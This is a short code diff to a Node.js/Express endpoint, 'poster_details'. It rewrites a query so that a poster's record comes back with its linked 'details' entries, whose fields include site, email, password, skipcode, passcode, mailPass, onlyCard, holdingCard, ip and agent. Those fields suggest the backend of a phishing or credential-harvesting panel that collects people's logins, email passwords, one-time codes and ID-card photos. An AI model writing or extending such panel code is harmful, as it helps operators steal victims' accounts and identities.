@@ -580,31 +580,30 @@ export const poster_details =async  (req, res) => {
 
 
 
-    Poster.findById(id)
-    .select('username password posterId links createdAt details')
-    .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent createdAt').sort({ createdAt: -1 })
+    // Poster.findById(id)
+    // .select('username password posterId links createdAt details')
+    // .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent createdAt').sort({ createdAt: -1 })
 
-    .then(data => {
-        return res.status(200).json({ data: data })    }
+    // .then(data => {
+    //     return res.status(200).json({ data: data })    }
 
 
-    ).catch(err => console.log('err', err))
+    // ).catch(err => console.log('err', err))
 
-    // try {
-
-    //     // .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt').sort({ createdAt: -1 })
+    try {
 
 
 
-    //     const poster = await Poster.findOne({ _id: id }).select('username password posterId links createdAt')
-    //     const data =await Poster.findOne({ _id: id }).select('username password posterId links createdAt')
-    //     return res.status(200).json({ poster: poster })
+
+        const poster = await Poster.findOne({ _id: id }).select('username password posterId links createdAt')
+        const details =await Info.find({ root: id }).select('site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent createdAt').sort({ createdAt: -1 })
+        return res.status(200).json({ data: {...poster, details: details }})
 
 
 
-    // } catch (e) {
-    //     res.status(400).json({ e: "error" })
-    // }
+    } catch (e) {
+        res.status(400).json({ e: "error" })
+    }
 
 }
 
